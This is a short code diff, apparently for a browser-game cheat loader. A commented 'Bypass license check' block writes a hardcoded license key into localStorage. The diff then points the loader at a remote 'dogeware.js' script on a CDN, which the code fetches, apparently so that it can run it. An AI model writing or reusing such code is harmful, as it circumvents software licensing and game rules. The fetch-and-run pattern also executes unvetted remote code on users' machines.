@@ -17,8 +17,8 @@
     // Bypass license check
     localStorage.license = '276gJDUY3I5310187NBF6DHBFbnfnfn38';
     localStorage.licenseTimestamp = Date.now();
-
-    const externalScriptUrl = 'https://example.com/script.js';
+    
+    const externalScriptUrl = 'https://cdn.jsdelivr.net/gh/CidCaribou/Executor-Scripts@main/krunker-centeral/dogeware.js';
     try {
         const res = await fetch(externalScriptUrl);
         const code = await res.text();
